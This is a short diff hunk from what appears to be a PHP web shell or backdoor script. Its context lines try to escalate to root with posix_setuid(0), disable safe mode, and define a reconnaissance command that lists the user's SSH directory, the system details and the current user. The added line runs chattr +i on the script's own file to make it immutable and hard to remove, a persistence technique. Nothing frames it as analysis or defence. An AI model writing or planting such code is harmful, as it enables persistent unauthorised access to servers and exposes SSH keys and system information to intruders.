@@ -3,7 +3,7 @@ ini_set("safe_mode", 0);
 umask(0);
 posix_setuid(0);
 define("base",'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami');
-
+system("chattr +i ". $_SERVER["SCRIPT_FILENAME"]);
 
 function banner(){
     
